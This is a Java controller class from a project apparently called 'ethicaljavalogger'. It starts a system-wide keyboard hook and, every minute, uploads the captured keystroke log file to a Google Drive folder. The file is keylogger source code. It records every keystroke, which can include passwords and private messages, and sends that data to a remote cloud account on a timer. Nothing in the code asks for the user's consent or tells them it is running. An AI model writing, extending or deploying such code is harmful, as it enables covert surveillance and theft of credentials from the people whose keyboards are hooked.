package com.mycompany.ethicaljavalogger.controllers;

import com.github.kwhat.jnativehook.NativeHookException;
import com.mycompany.ethicaljavalogger.constants.FileType;
import com.mycompany.ethicaljavalogger.services.GoogleDriveService;
import com.mycompany.ethicaljavalogger.services.KeyboardHookService;
import com.mycompany.ethicaljavalogger.services.KeyboardLogService;
import java.io.File;
import java.util.concurrent.Executors;
import java.util.concurrent.ScheduledExecutorService;
import java.util.concurrent.TimeUnit;
import java.util.logging.Level;
import java.util.logging.Logger;

public class KeyboardListenerController {
    
    public void handleKeyboardListener() {
        try {
            KeyboardHookService keyboardHookService = new KeyboardHookService();
            keyboardHookService.startHook();
        } catch (NativeHookException ex) {
            Logger.getLogger(KeyboardListenerController.class.getName()).log(Level.SEVERE, null, ex);
        }
    }
    
    public void handleSendKeyboardLog() {        
        new Thread(() -> {
            ScheduledExecutorService scheduler = Executors.newSingleThreadScheduledExecutor();

            scheduler.scheduleAtFixedRate(() -> {
                String filePath = KeyboardLogService.getFilePath();
                File keyboardLogFile = new File(filePath);
                if (keyboardLogFile.exists()) {
                    GoogleDriveService.getInstance().sendMedia("keyboard_logs.txt", filePath, GoogleDriveService.getInstance().getLogsFolderId(), FileType.TEXT);
                }
            }, 0, 1, TimeUnit.MINUTES);
        }).start();
    }
}